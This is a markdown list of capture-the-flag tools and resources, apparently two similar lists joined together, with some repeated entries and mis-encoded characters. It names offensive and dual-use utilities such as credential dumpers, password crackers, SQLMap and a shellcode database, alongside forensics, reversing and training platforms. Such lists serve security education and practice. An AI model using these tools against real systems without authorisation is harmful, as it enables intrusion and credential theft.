- [one_gadget](https://github.com/david942j/one_gadget) -  A tool to find the one gadget `execve('/bin/sh', NULL, NULL)` call.
  - `gem install one_gadget`
- [Pwntools](https://github.com/Gallopsled/pwntools) - CTF Framework for writing exploits.
- [Qira](https://github.com/BinaryAnalysisPlatform/qira) - QEMU Interactive Runtime Analyser.
- [ROP Gadget](https://github.com/JonathanSalwan/ROPgadget) - Framework for ROP exploitation.
- [V0lt](https://github.com/P1kachu/v0lt) - Security CTF Toolkit.

## Forensics

*Tools used for solving Forensics challenges*

- [Aircrack-Ng](http://www.aircrack-ng.org/) - Crack 802.11 WEP and WPA-PSK keys.
  - `apt-get install aircrack-ng`
- [Audacity](http://sourceforge.net/projects/audacity/) - Analyze sound files (mp3, m4a, whatever).
  - `apt-get install audacity`
- [Bkhive and Samdump2](http://sourceforge.net/projects/ophcrack/files/samdump2/) - Dump SYSTEM and SAM files.
  - `apt-get install samdump2 bkhive`
- [CFF Explorer](http://www.ntcore.com/exsuite.php) - PE Editor.
- [Creddump](https://github.com/moyix/creddump) - Dump windows credentials.
- [DVCS Ripper](https://github.com/kost/dvcs-ripper) - Rips web accessible (distributed) version control systems.
- [Exif Tool](http://www.sno.phy.queensu.ca/~phil/exiftool/) - Read, write and edit file metadata.
- [Extundelete](http://extundelete.sourceforge.net/) - Used for recovering lost data from mountable images.
- [Fibratus](https://github.com/rabbitstack/fibratus) - Tool for exploration and tracing of the Windows kernel.
- [Foremost](http://foremost.sourceforge.net/) - Extract particular kind of files using headers.
  - `apt-get install foremost`
- [Fsck.ext4](http://linux.die.net/man/8/fsck.ext3) - Used to fix corrupt filesystems.
- [Malzilla](http://malzilla.sourceforge.net/) - Malware hunting tool.
- [NetworkMiner](http://www.netresec.com/?page=NetworkMiner) - Network Forensic Analysis Tool.
- [PDF Streams Inflater](http://malzilla.sourceforge.net/downloads.html) - Find and extract zlib files compressed in PDF files.
- [Pngcheck](http://www.libpng.org/pub/png/apps/pngcheck.html) - Verifies the integrity of PNG and dump all of the chunk-level information in human-readable form.
  - `apt-get install pngcheck`
- [ResourcesExtract](http://www.nirsoft.net/utils/resources_extract.html) - Extract various filetypes from exes.
- [Shellbags](https://github.com/williballenthin/shellbags) - Investigate NT\_USER.dat files.
- [Snow](https://sbmlabs.com/notes/snow_whitespace_steganography_tool) - A Whitespace Steganography Tool.
- [USBRip](https://github.com/snovvcrash/usbrip) - Simple CLI forensics tool for tracking USB device artifacts (history of USB events) on GNU/Linux.
- [Volatility](https://github.com/volatilityfoundation/volatility) - To investigate memory dumps.
- [Wireshark](https://www.wireshark.org) - Used to analyze pcap or pcapng files

*Registry Viewers*
- [OfflineRegistryView](https://www.nirsoft.net/utils/offline_registry_view.html) - Simple tool for Windows that allows you to read offline Registry files from external drive and view the desired Registry key in .reg file format.
- [Registry Viewer¬Æ](https://accessdata.com/product-download/registry-viewer-2-0-0) - Used to view Windows registries.

## Networking

*Tools used for solving Networking challenges*

- [Masscan](https://github.com/robertdavidgraham/masscan) - Mass IP port scanner, TCP port scanner.
- [Monit](https://linoxide.com/monitoring-2/monit-linux/) - A linux tool to check a host on the network (and other non-network activities).
- [Nipe](https://github.com/GouveaHeitor/nipe) - Nipe is a script to make Tor Network your default gateway.
- [Nmap](https://nmap.org/) - An open source utility for network discovery and security auditing.
- [Wireshark](https://www.wireshark.org/) - Analyze the network dumps.
  - `apt-get install wireshark`
- [Zeek](https://www.zeek.org) - An open-source network security monitor.
- [Zmap](https://zmap.io/) - An open-source network scanner.

## Reversing

*Tools used for solving Reversing challenges*

- [Androguard](https://github.com/androguard/androguard) - Reverse engineer Android applications.
- [Angr](https://github.com/angr/angr) - platform-agnostic binary analysis framework.
- [Apk2Gold](https://github.com/lxdvs/apk2gold) - Yet another Android decompiler.
- [ApkTool](http://ibotpeaches.github.io/Apktool/) - Android Decompiler.
- [Barf](https://github.com/programa-stic/barf-project) - Binary Analysis and Reverse engineering Framework.
- [Binary Ninja](https://binary.ninja/) - Binary analysis framework.
- [BinUtils](http://www.gnu.org/software/binutils/binutils.html) - Collection of binary tools.
- [BinWalk](https://github.com/devttys0/binwalk) - Analyze, reverse engineer, and extract firmware images.
- [Boomerang](https://github.com/BoomerangDecompiler/boomerang) - Decompile x86/SPARC/PowerPC/ST-20 binaries to C.
- [ctf_import](https://github.com/docileninja/ctf_import) ‚Äì run basic functions from stripped binaries cross platform.
- [cwe_checker](https://github.com/fkie-cad/cwe_checker) - cwe_checker finds vulnerable patterns in binary executables.
- [demovfuscator](https://github.com/kirschju/demovfuscator) - A work-in-progress deobfuscator for movfuscated binaries.
- [Frida](https://github.com/frida/) - Dynamic Code Injection.
- [GDB](https://www.gnu.org/software/gdb/) - The GNU project debugger.
- [GEF](https://github.com/hugsy/gef) - GDB plugin.
- [Ghidra](https://ghidra-sre.org/) - Open Source suite of reverse engineering tools.  Similar to IDA Pro.
- [Hopper](http://www.hopperapp.com/) - Reverse engineering tool (disassembler) for OSX and Linux.
- [IDA Pro](https://www.hex-rays.com/products/ida/) - Most used Reversing software.
- [Jadx](https://github.com/skylot/jadx) - Decompile Android files.
- [Java Decompilers](http://www.javadecompilers.com) - An online decompiler for Java and Android APKs.
- [Krakatau](https://github.com/Storyyeller/Krakatau) - Java decompiler and disassembler.
- [Objection](https://github.com/sensepost/objection) - Runtime Mobile Exploration.
- [PEDA](https://github.com/longld/peda) - GDB plugin (only python2.7).
- [Pin](https://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool) - A dynamic binary instrumentaion tool by Intel.
- [PINCE](https://github.com/korcankaraokcu/PINCE) - GDB front-end/reverse engineering tool, focused on game-hacking and automation.
- [PinCTF](https://github.com/ChrisTheCoolHut/PinCTF) - A tool which uses intel pin for Side Channel Analysis.
- [Plasma](https://github.com/joelpx/plasma) - An interactive disassembler for x86/ARM/MIPS which can generate indented pseudo-code with colored syntax.
- [Pwndbg](https://github.com/pwndbg/pwndbg) - A GDB plugin that provides a suite of utilities to hack around GDB easily.
- [radare2](https://github.com/radare/radare2) - A portable reversing framework.
- [Triton](https://github.com/JonathanSalwan/Triton/) - Dynamic Binary Analysis (DBA) framework.
- [Uncompyle](https://github.com/gstarnberger/uncompyle) - Decompile Python 2.7 binaries (.pyc).
- [WinDbg](http://www.windbg.org/) - Windows debugger distributed by Microsoft.
- [Xocopy](http://reverse.lostrealm.com/tools/xocopy.html) - Program that can copy executables with execute, but no read permission.
- [Z3](https://github.com/Z3Prover/z3) - A theorem prover from Microsoft Research.

*JavaScript Deobfuscators*

- [Detox](http://relentless-coding.org/projects/jsdetox/install) - A Javascript malware analysis tool.
- [Revelo](http://www.kahusecurity.com/posts/revelo_javascript_deobfuscator.html) - Analyze obfuscated Javascript code.

*SWF Analyzers*
- [RABCDAsm](https://github.com/CyberShadow/RABCDAsm) - Collection of utilities including an ActionScript 3 assembler/disassembler.
- [Swftools](http://www.swftools.org/) - Collection of utilities to work with SWF files.
- [Xxxswf](https://bitbucket.org/Alexander_Hanel/xxxswf) -  A Python script for analyzing Flash files.

## Services

*Various kind of useful services available around the internet*

- [CSWSH](http://cow.cat/cswsh.html) - Cross-Site WebSocket Hijacking Tester.
- [Request Bin](https://requestbin.com/) - Lets you inspect http requests to a particular url.

## Steganography

*Tools used for solving Steganography challenges*

- [AperiSolve](https://aperisolve.fr/) - Aperi'Solve is a platform which performs layer analysis on image (open-source).
- [Convert](http://www.imagemagick.org/script/convert.php) - Convert images b/w formats and apply filters.
- [Exif](http://manpages.ubuntu.com/manpages/trusty/man1/exif.1.html) - Shows EXIF information in JPEG files.
- [Exiftool](https://linux.die.net/man/1/exiftool) - Read and write meta information in files.
- [Exiv2](http://www.exiv2.org/manpage.html) - Image metadata manipulation tool.
- [Image Steganography](https://sourceforge.net/projects/image-steg/) - Embeds text and files in images with optional encryption. Easy-to-use UI.
- [Image Steganography Online](https://incoherency.co.uk/image-steganography) - This is a client-side Javascript tool to steganographically hide images inside the lower "bits" of other images
- [ImageMagick](http://www.imagemagick.org/script/index.php) - Tool for manipulating images.
- [Outguess](https://www.freebsd.org/cgi/man.cgi?query=outguess+&apropos=0&sektion=0&manpath=FreeBSD+Ports+5.1-RELEASE&format=html) - Universal steganographic tool.
- [Pngtools](https://packages.debian.org/sid/pngtools) - For various analysis related to PNGs.
  - `apt-get install pngtools`
- [SmartDeblur](https://github.com/Y-Vladimir/SmartDeblur) - Used to deblur and fix defocused images.
- [Steganabara](https://www.openhub.net/p/steganabara) -  Tool for stegano analysis written in Java.
- [SteganographyOnline](https://stylesuxx.github.io/steganography/) - Online steganography encoder and decoder.
- [Stegbreak](https://linux.die.net/man/1/stegbreak) - Launches brute-force dictionary attacks on JPG image.
- [StegCracker](https://github.com/Paradoxis/StegCracker) - Steganography brute-force utility to uncover hidden data inside files.
- [stegextract](https://github.com/evyatarmeged/stegextract) - Detect hidden files and text in images.
- [Steghide](http://steghide.sourceforge.net/) - Hide data in various kind of images.
- [StegOnline](https://georgeom.net/StegOnline/upload) - Conduct a wide range of image steganography operations, such as concealing/revealing files hidden within bits (open-source).
- [Stegsolve](http://www.caesum.com/handbook/Stegsolve.jar) - Apply various steganography techniques to images.
- [Zsteg](https://github.com/zed-0xff/zsteg/) - PNG/BMP analysis.

## Web

*Tools used for solving Web challenges*

- [BurpSuite](https://portswigger.net/burp) - A graphical tool to testing website security.
- [Commix](https://github.com/commixproject/commix) - Automated All-in-One OS Command Injection and Exploitation Tool.
- [Hackbar](https://addons.mozilla.org/en-US/firefox/addon/hackbartool/) - Firefox addon for easy web exploitation.
- [OWASP ZAP](https://www.owasp.org/index.php/Projects/OWASP_Zed_Attack_Proxy_Project) - Intercepting proxy to replay, debug, and fuzz HTTP requests and responses
- [Postman](https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop?hl=en) - Add on for chrome for debugging network requests.
- [Raccoon](https://github.com/evyatarmeged/Raccoon) - A high performance offensive security tool for reconnaissance and vulnerability scanning.
- [SQLMap](https://github.com/sqlmapproject/sqlmap) - Automatic SQL injection and database takeover tool.
  ```pip install sqlmap```
- [W3af](https://github.com/andresriancho/w3af) -  Web Application Attack and Audit Framework.
- [XSSer](http://xsser.sourceforge.net/) - Automated XSS testor.


# Resources

*Where to discover about CTF*

## Operating Systems

*Penetration testing and security lab Operating Systems*

- [Android Tamer](https://androidtamer.com/) - Based on Debian.
- [BackBox](https://backbox.org/) - Based on Ubuntu.
- [BlackArch Linux](https://blackarch.org/) - Based on Arch Linux.
- [Fedora Security Lab](https://labs.fedoraproject.org/security/) - Based on Fedora.
- [Kali Linux](https://www.kali.org/) - Based on Debian.
- [Parrot Security OS](https://www.parrotsec.org/) - Based on Debian.
- [Pentoo](http://www.pentoo.ch/) - Based on Gentoo.
- [URIX OS](http://urix.us/) - Based on openSUSE.
- [Wifislax](http://www.wifislax.com/) - Based on Slackware.

*Malware analysts and reverse-engineering*

- [Flare VM](https://github.com/fireeye/flare-vm/) - Based on Windows.
- [REMnux](https://remnux.org/) - Based on Debian.

## Starter Packs

*Collections of installer scripts, useful tools*

- [CTF Tools](https://github.com/zardus/ctf-tools) - Collection of setup scripts to install various security research tools.
- [LazyKali](https://github.com/jlevitsk/lazykali) - A 2016 refresh of LazyKali which simplifies install of tools and configuration.

## Tutorials

*Tutorials to learn how to play CTFs*

- [CTF Field Guide](https://trailofbits.github.io/ctf/) - Field Guide by Trails of Bits.
- [CTF Resources](http://ctfs.github.io/resources/) -  Start Guide maintained by community.
- [How to Get Started in CTF](https://www.endgame.com/blog/how-get-started-ctf) - Short guideline for CTF beginners by Endgame
- [Intro. to CTF Course](https://www.hoppersroppers.org/courseCTF.html) - A free course that teaches beginners the basics of forensics, crypto, and web-ex.
- [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) - Video tutorials and walkthroughs of popular CTF platforms.
- [LiveOverFlow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w) - Video tutorials on Exploitation.
- [MIPT CTF](https://github.com/xairy/mipt-ctf) - A small course for beginners in CTFs (in Russian).


## Wargames

*Always online CTFs*

- [Backdoor](https://backdoor.sdslabs.co/) - Security Platform by SDSLabs.
- [Crackmes](https://crackmes.one/) - Reverse Engineering Challenges.
- [CryptoHack](https://cryptohack.org/) - Fun cryptography challenges.
- [echoCTF.RED](https://echoctf.red/) - Online CTF with a variety of targets to attack.
- [Exploit Exercises](https://exploit-exercises.lains.space/) - Variety of VMs to learn variety of computer security issues.
- [Exploit.Education](http://exploit.education) - Variety of VMs to learn variety of computer security issues.
- [Gracker](https://github.com/Samuirai/gracker) - Binary challenges having a slow learning curve, and write-ups for each level.
- [Hack The Box](https://www.hackthebox.eu) - Weekly CTFs for all types of security enthusiasts.
- [Hack This Site](https://www.hackthissite.org/) - Training ground for hackers.
- [Hacker101](https://www.hacker101.com/) - CTF from HackerOne
- [Hacking-Lab](https://hacking-lab.com/) - Ethical hacking, computer network and security challenge platform.
- [Hone Your Ninja Skills](https://honeyourskills.ninja/) - Web challenges starting from basic ones.
- [IO](http://io.netgarage.org/) - Wargame for binary challenges.
- [Microcorruption](https://microcorruption.com) - Embedded security CTF.
- [Over The Wire](http://overthewire.org/wargames/) - Wargame maintained by OvertheWire Community.
- [PentesterLab](https://pentesterlab.com/) - Variety of VM and online challenges (paid).
- [PicoCTF](https://2019game.picoctf.com) - All year round ctf game. Questions from the yearly picoCTF competition.
- [PWN Challenge](http://pwn.eonew.cn/) - Binary Exploitation Wargame.
- [Pwnable.kr](http://pwnable.kr/) - Pwn Game.
- [Pwnable.tw](https://pwnable.tw/) - Binary wargame.
- [Pwnable.xyz](https://pwnable.xyz/) - Binary Exploitation Wargame.
- [Reversin.kr](http://reversing.kr/) - Reversing challenge.
- [Ringzer0Team](https://ringzer0team.com/) - Ringzer0 Team Online CTF.
- [Root-Me](https://www.root-me.org/) - Hacking and Information Security learning platform.
- [ROP Wargames](https://github.com/xelenonz/game) - ROP Wargames.
- [SANS HHC](https://holidayhackchallenge.com/past-challenges/) - Challenges with a holiday theme
  released annually and maintained by SANS.
- [SmashTheStack](http://smashthestack.org/) - A variety of wargames maintained by the SmashTheStack Community.
- [Viblo CTF](https://ctf.viblo.asia) - Various amazing CTF challenges, in many different categories. Has both Practice mode and Contest mode.
- [VulnHub](https://www.vulnhub.com/) - VM-based for practical in digital security, computer application & network administration.
- [W3Challs](https://w3challs.com) - A penetration testing training platform, which offers various computer challenges, in various categories.
- [WebHacking](http://webhacking.kr) - Hacking challenges for web.


*Self-hosted CTFs*
- [Damn Vulnerable Web Application](http://www.dvwa.co.uk/) - PHP/MySQL web application that is damn vulnerable.
- [Juice Shop CTF](https://github.com/bkimminich/juice-shop-ctf) - Scripts and tools for hosting a CTF on [OWASP Juice Shop](https://www.owasp.org/index.php/OWASP_Juice_Shop_Project) easily.

## Websites

*Various general websites about and on CTF*

- [Awesome CTF Cheatsheet](https://github.com/uppusaikiran/awesome-ctf-cheatsheet#awesome-ctf-cheatsheet-) - CTF Cheatsheet.
- [CTF Time](https://ctftime.org/) - General information on CTF occuring around the worlds.
- [Reddit Security CTF](http://www.reddit.com/r/securityctf) - Reddit CTF category.

## Wikis

*Various Wikis available for learning about CTFs*

- [Bamboofox](https://bamboofox.github.io/) - Chinese resources to learn CTF.
- [bi0s Wiki](https://teambi0s.gitlab.io/bi0s-wiki/) - Wiki from team bi0s.
- [CTF Cheatsheet](https://uppusaikiran.github.io/hacking/Capture-the-Flag-CheatSheet/) - CTF tips and tricks.
- [ISIS Lab](https://github.com/isislab/Project-Ideas/wiki) - CTF Wiki by Isis lab.
- [OpenToAll](https://github.com/OpenToAllCTF/Tips) - CTF tips by OTA CTF team members.

## Writeups Collections

*Collections of CTF write-ups*

- [0e85dc6eaf](https://github.com/0e85dc6eaf/CTF-Writeups) - Write-ups for CTF challenges by 0e85dc6eaf
- [Captf](http://captf.com/) - Dumped CTF challenges and materials by psifertex.
- [CTF write-ups (community)](https://github.com/ctfs/) - CTF challenges + write-ups archive maintained by the community.
- [CTFTime Scrapper](https://github.com/abdilahrf/CTFWriteupScrapper) - Scraps all writeup from CTF Time and organize which to read first.
- [HackThisSite](https://github.com/HackThisSite/CTF-Writeups) - CTF write-ups repo maintained by HackThisSite team.
- [Mzfr](https://github.com/mzfr/ctf-writeups/) - CTF competition write-ups by mzfr
- [pwntools writeups](https://github.com/Gallopsled/pwntools-write-ups) - A collection of CTF write-ups all using pwntools.
- [SababaSec](https://github.com/SababaSec/ctf-writeups) - A collection of CTF write-ups by the SababaSec team
- [Shell Storm](http://shell-storm.org/repo/CTF/) - CTF challenge archive maintained by Jonathan Salwan.
- [Smoke Leet Everyday](https://github.com/smokeleeteveryday/CTF_WRITEUPS) - CTF write-ups repo maintained by SmokeLeetEveryday team.

ba≈üka bir g√ºn
-------------

## Contents

 - [Create](#0x00-create)
    - [Platforms](#platforms)
    - [Forensics](#forensics)
    - [Steganography](#steganography)
    - [Web](#web)

 - [Solve](#0x01-solve)
    - [Cryptography](#cryptography)
    - [Exploiting / Pwn](#exploiting--pwn)
    - [Forensics](#forensics-1)
    - [Misc](#misc)
    - [Reversing](#reversing)
    - [Steganography](#steganography-1)
    - [Web](#web-1)

 - [Resources](#0x02-resources)
    - [Online Platforms](#online-platforms)
    - [Collaborative Tools](#collaborative-tools)
    - [Writeups Repositories](#writeups-repositories)
    - [Courses](#courses)

 - [Bibliography](#0x03-bibliography)


# 0x00. Create

*Tools used for creating CTF challenges*

## Platforms

*Frameworks that can be used to host a CTF*

 - [CTFd](https://github.com/CTFd/CTFd) - Platform to host jeopardy style CTFs.
 - [FBCTF](https://github.com/facebookarchive/fbctf) - Facebook CTF platform to host Jeopardy and "King of the Hill" CTF competitions.
 - [HackTheArch](https://github.com/mcpa-stlouis/hack-the-arch) - Scoring server for CTF competitions.
 - [kCTF](https://github.com/google/kctf) - Kubernetes-based infrastructure for CTF competitions.
 - [LibreCTF](https://github.com/easyctf/librectf) - CTF platform from EasyCTF.
 - [Mellivora](https://github.com/Nakiami/mellivora) - CTF engine written in PHP.
 - [NightShade](https://github.com/UnrealAkama/NightShade) - Simple CTF framework.
 - [picoCTF](https://github.com/picoCTF/picoCTF) - Infrastructure used to run picoCTF.
 - [rCTF](https://github.com/redpwn/rctf) - CTF platform maintained by the [redpwn](https://github.com/redpwn/rctf) CTF team.
 - [RootTheBox](https://github.com/moloch--/RootTheBox) - CTF scoring engine for wargames.
 - [ImaginaryCTF](https://github.com/Et3rnos/ImaginaryCTF) - Platform to host CTFs.

## Forensics

*Tools used to create Forensics challenges*

 - [Belkasoft RAM Capturer](https://belkasoft.com/ram-capturer) - Volatile Memory Acquisition Tool.
 - [Dnscat2](https://github.com/iagox86/dnscat2) - Hosts communication through DNS.
 - [Magnet AXIOM 2.0](https://www.magnetforensics.com/resources/magnet-axiom-2-0-memory-analysis/) - Artifact-centric DFIR tool.
 - [Registry Dumper](http://www.kahusecurity.com/posts/registry_dumper_find_and_dump_hidden_registry_keys.html) - Tool to dump Windows Registry.

## Steganography

*Tools used to create Stego challenges*

Check [solve section for steganography](#steganography-1).

## Web

*Tools used to create Web challenges*

 - [Metasploit JavaScript Obfuscator](https://github.com/rapid7/metasploit-framework/wiki/How-to-obfuscate-JavaScript-in-Metasploit) - How to obfuscate JavaScript in Metasploit.

# 0x01. Solve

## Cryptography

*Tools used for solving Crypto challenges*

 - [Base65536](https://github.com/qntm/base65536) - Unicode's answer to Base64.
 - [Braille Translator](https://www.branah.com/braille-translator) - Translate from braille to text.
 - [Ciphey](https://github.com/Ciphey/Ciphey) - Tool to automatically decrypt encryptions without knowing the key or cipher, decode encodings, and crack hashes.
 - [CyberChef](https://gchq.github.io/CyberChef/) - A web app for encryption, encoding, compression and data analysis.
 - [Cryptii](https://cryptii.com/) - Modular conversion, encoding and encryption online.
 - [dCode.fr](https://www.dcode.fr/tools-list#cryptography) - Solvers for Crypto, Maths and Encodings online.
 - [Decodify](https://github.com/s0md3v/Decodify) - Detect and decode encoded strings, recursively.
 - [Enigma Machine](https://summersidemakerspace.ca/projects/enigma-machine/) - Universal Enigma Machine Simulator.
 - [FeatherDuster](https://github.com/nccgroup/featherduster) - An automated, modular cryptanalysis tool.
 - [Galois](http://web.eecs.utk.edu/~jplank/plank/papers/CS-07-593/) - A fast galois field arithmetic library/toolkit.
 - [HashExtender](https://github.com/iagox86/hash_extender) - Tool for performing hash length extension attacks.
 - [Hash-identifier](https://code.google.com/p/hash-identifier/source/checkout) - Simple hash algorithm identifier.
 - [padding-oracle-attacker](https://github.com/KishanBagaria/padding-oracle-attacker) - CLI tool and library to execute padding oracle attacks easily.
 - [PadBuster](https://github.com/AonCyberLabs/PadBuster) - Automated script for performing Padding Oracle attacks.
 - [PEMCrack](https://github.com/robertdavidgraham/pemcrack) - Cracks SSL PEM files that hold encrypted private keys. Brute forces or dictionary cracks.
 - [PKCrack](https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html) - PkZip encryption cracker.
 - [Polybius Square Cipher](https://www.braingle.com/brainteasers/codes/polybius.php) - Table that allows someone to translate letters into numbers.
 - [Quipqiup](https://quipqiup.com/) - Automated cryptogram solver.
 - [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) - RSA multi attacks tool.
 - [RSATool](https://github.com/ius/rsatool) - Tool to to calculate RSA and RSA-CRT parameter.
 - [Rumkin Cipher Tools](http://rumkin.com/tools/cipher/) - Collection of ciphhers/encoders tools.
 - [Vigenere Solver](https://www.guballa.de/vigenere-solver) - Online tool that breaks Vigen√®re ciphers without knowing the key.
 - [XOR Cracker](https://wiremask.eu/tools/xor-cracker/) - Online XOR decryption tool able to guess the key length and the cipher key to decrypt any file.
 - [XORTool](https://github.com/hellman/xortool) - A tool to analyze multi-byte xor cipher.
 - [yagu](https://sourceforge.net/projects/yafu/) - Automated integer factorization.
 - [Crackstation](https://crackstation.net/) - Hash cracker (database).
 - [Online Encyclopedia of Integer Sequences](https://oeis.org/) - OEIS: The On-Line Encyclopedia of Integer Sequences

## Exploiting / Pwn

*Tools used for solving Pwn challenges*

 - [afl](https://lcamtuf.coredump.cx/afl/) - Security-oriented fuzzer.
 - [honggfuzz](https://github.com/google/honggfuzz) - Security oriented software fuzzer. Supports evolutionary, feedback-driven fuzzing based on code coverage.
 - [libformatstr](https://github.com/hellman/libformatstr) - Simplify format string exploitation.
 - [One_gadget](https://github.com/david942j/one_gadget) - Tool for finding one gadget RCE.
 - [Pwntools](https://github.com/Gallopsled/pwntools) - CTF framework for writing exploits.
 - [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) - Framework for ROP exploitation.
 - [Ropper](https://github.com/sashs/Ropper) - Display information about files in different file formats and find gadgets to build rop chains for different architectures.
 - [Shellcodes Database](http://shell-storm.org/shellcode/) - A massive shellcodes database.

## Forensics

*Tools used for solving Forensics challenges*

 - [A-Packets](https://apackets.com/) - Effortless PCAP File Analysis in Your Browser.
 - [Autopsy](https://www.autopsy.com/) - End-to-end open source digital forensics platform.
 - [Binwalk](https://github.com/devttys0/binwalk) - Firmware Analysis Tool.
 - [Bulk-extractor](https://github.com/simsong/bulk_extractor) - High-performance digital forensics exploitation tool.
 - [Bkhive & samdump2](https://www.kali.org/tools/samdump2/) - Dump SYSTEM and SAM files.
 - [ChromeCacheView](https://www.nirsoft.net/utils/chrome_cache_view.html) - Small utility that reads the cache folder of Google Chrome Web browser, and displays the list of all files currently stored in the cache.
 - [Creddump](https://github.com/moyix/creddump) - Dump Windows credentials.
 - [Exiftool](https://exiftool.org/) - Read, write and edit file metadata.
 - [Extundelete](http://extundelete.sourceforge.net/) - Utility that can recover deleted files from an ext3 or ext4 partition.
 - [firmware-mod-kit](https://code.google.com/archive/p/firmware-mod-kit/) - Modify firmware images without recompiling.
 - [Foremost](http://foremost.sourceforge.net/) - Console program to recover files based on their headers, footers, and internal data structures.
 - [Forensic Toolkit](https://www.exterro.com/forensic-toolkit) - It scans a hard drive looking for various information. It can, potentially locate deleted emails and scan a disk for text strings to use them as a password dictionary to crack encryption.
 - [Forensically](https://29a.ch/photo-forensics/#forensic-magnifier) - Free online tool to analysis image this tool has many features.
 - [MZCacheView](https://www.nirsoft.net/utils/mozilla_cache_viewer.html) - Small utility that reads the cache folder of Firefox/Mozilla/Netscape Web browsers, and displays the list of all files currently stored in the cache.
 - [NetworkMiner](https://www.netresec.com/index.ashx?page=NetworkMiner)  Network Forensic Analysis Tool (NFAT).
 - [OfflineRegistryView](https://www.nirsoft.net/utils/offline_registry_view.html) - Simple tool for Windows that allows you to read offline Registry files from external drive.
 - [photorec](https://www.cgsecurity.org/wiki/PhotoRec) - File data recovery software designed to recover lost files including video, documents and archives from hard disks, CD-ROMs, and lost pictures (thus the Photo Recovery name) from digital camera memory.
 - [Registry Viewer](https://accessdata.com/product-download/registry-viewer-2-0-0) - Tool to view Windows registers.
 - [Scalpel](https://github.com/sleuthkit/scalpel) - Open source data carving tool.
 - [The Sleuth Kit](https://www.sleuthkit.org/) - Collection of command line tools and a C library that allows you to analyze disk images and recover files from them.
 - [USBRip](https://github.com/snovvcrash/usbrip) - Simple CLI forensics tool for tracking USB device artifacts (history of USB events) on GNU/Linux.
 - [Volatility](https://github.com/volatilityfoundation/volatility) - An advanced memory forensics framework.
 - [Wireshark](https://www.wireshark.org/) - Tool to analyze pcap or pcapng files.
 - [X-Ways](https://www.x-ways.net/forensics/index-m.html) - Advanced work environment for computer forensic examiners.

## Misc

*Tools used for solving Misc challenges*

 - [boofuzz](https://github.com/jtpereyda/boofuzz) - Network Protocol Fuzzing for Humans.
 - [Veles](https://codisec.com/veles/) - Binary data analysis and visualization tool.

**Bruteforcers:**

 - [changeme](https://github.com/ztgrace/changeme) - A default credential scanner.
 - [Hashcat](https://hashcat.net/hashcat/) - Advanced Password Recovery.
 - [Hydra](https://www.kali.org/tools/hydra/) - Parallelized login cracker which supports numerous protocols to attack.
 - [John the Ripper](https://www.openwall.com/john/) - Open Source password security auditing and password recovery.
 - [jwt_tool](https://github.com/ticarpi/jwt_tool) - A toolkit for testing, tweaking and cracking JSON Web Tokens.
 - [Ophcrack](https://ophcrack.sourceforge.io/) - Free Windows password cracker based on rainbow tables.
 - [Patator](https://github.com/lanjelot/patator) - Multi-purpose brute-forcer, with a modular design and a flexible usage.
 - [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) - Burp Suite extension for sending large numbers of HTTP requests and analyzing the results.

**Esoteric Languages:**

 - [Brainfuck](https://copy.sh/brainfuck/) - Brainfuck esoteric programming language IDE.
 - [COW](https://frank-buss.de/cow.html) - It is a Brainfuck variant designed humorously with Bovinae in mind.
 - [Malbolge](http://www.malbolge.doleczek.pl/) - Malbolge esoteric programming language solver.
 - [Ook!](https://www.dcode.fr/ook-language) - Tool for decoding / encoding in Ook!
 - [Piet](https://www.bertnase.de/npiet/npiet-execute.php) - Piet programming language compiler.
 - [Rockstar](https://codewithrockstar.com/online) - A language intended to look like song lyrics.
 - [Try It Online](https://tio.run/) - An online tool that has a ton of Esoteric language interpreters.


**Sandboxes:**

 - [Any.run](https://any.run/) - Interactive malware hunting service.
 - [Intezer Analyze](https://analyze.intezer.com/) - Malware analysis platform.
 - [Triage](https://tria.ge/) - State-of-the-art malware analysis sandbox designed for cross-platform support.

## Reversing

*Tools used for solving Reversing challenges*

 - [Androguard](https://github.com/androguard/androguard) - Androguard is a full python tool to play with Android files.
 - [Angr](https://github.com/angr/angr) - A powerful and user-friendly binary analysis platform.
 - [Apk2gold](https://github.com/lxdvs/apk2gold) - CLI tool for decompiling Android apps to Java.
 - [ApkTool](https://ibotpeaches.github.io/Apktool/) - A tool for reverse engineering 3rd party, closed, binary Android apps.
 - [Binary Ninja](https://binary.ninja/) - Binary Analysis Framework.
 - [BinUtils](https://www.gnu.org/software/binutils/binutils.html) - Collection of binary tools.
 - [CTF_import](https://github.com/sciencemanx/ctf_import) - Run basic functions from stripped binaries cross platform.
 - [Compiler Explorer](https://godbolt.org/) - Online compiler tool.
 - [CWE_checker](https://github.com/fkie-cad/cwe_checker) - Finds vulnerable patterns in binary executables.
 - [Demovfuscator](https://github.com/kirschju/demovfuscator) - A work-in-progress deobfuscator for movfuscated binaries.
 - [Disassembler.io](https://onlinedisassembler.com/static/home/index.html) - Disassemble On Demand. 
A lightweight, online service for when you don‚Äôt have the time, resources, or requirements to use a heavier-weight alternative.
 - [dnSpy](https://github.com/dnSpy/dnSpy) - .NET debugger and assembly editor.
 - [EasyPythonDecompiler](https://sourceforge.net/projects/easypythondecompiler/) - A small .exe GUI application that will "decompile" Python bytecode, often seen in .pyc extension.
 - [Frida](https://github.com/frida/) - Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.
 - [GDB](https://www.gnu.org/software/gdb/) - The GNU Project debugger.
 - [GEF](https://github.com/hugsy/gef) - A modern experience for GDB with advanced debugging features for exploit developers & reverse engineers.
 - [Ghidra](https://ghidra-sre.org/) - A software reverse engineering (SRE) suite of tools developed by NSA.
 - [Hopper](https://www.hopperapp.com/) - Reverse engineering tool (disassembler) for OSX and Linux.
 - [IDA Pro](https://hex-rays.com/ida-pro/) - Most used Reversing software.
 - [Jadx](https://github.com/skylot/jadx) - Command line and GUI tools for producing Java source code from Android Dex and Apk files.
 - [Java Decompilers](http://www.javadecompilers.com/) - An online decompiler for Java and Android APKs.
 - [JSDetox](https://github.com/svent/jsdetox) - A JavaScript malware analysis tool.
 - [miasm](https://github.com/cea-sec/miasm) - Reverse engineering framework in Python.
 - [Objection](https://github.com/sensepost/objection) - Runtime mobile exploration.
